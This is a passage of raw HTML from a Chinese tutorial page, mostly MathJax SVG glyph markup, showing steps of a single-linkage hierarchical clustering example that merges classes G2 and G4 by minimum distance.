viewBox="0 -705 2889.8 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1667.2,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>之间的最短距离，为</p><script type="math/tex; mode=display">d_{72}=\min(d_{12},d_{32},d_{52})=5\\d_{74}=\min(d_{14},d_{34},d_{54})=5</script><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="6.538ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 2889.8 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1667.2,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>之间的距离为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.112ex" height="1.91ex" role="img" focusable="false" viewBox="0 -694 3143.7 844"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1587.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2643.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container>。显然<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.112ex" height="1.91ex" role="img" focusable="false" viewBox="0 -694 3143.7 844"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1587.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2643.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container>最小，所以将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 1222.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 1222.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>合并成一个新类，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="13.615ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6017.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g><g data-mml-node="mo" transform="translate(1500.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2556.1,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3056.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4064.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4509.3,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(5517.9,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。</p><p>最后将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="6.538ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 2889.8 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1667.2,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g></g></g></svg></mjx-container>合并成一个新类，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="23.479ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10377.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g></g><g data-mml-node="mo" transform="translate(1500.3,0)"><path 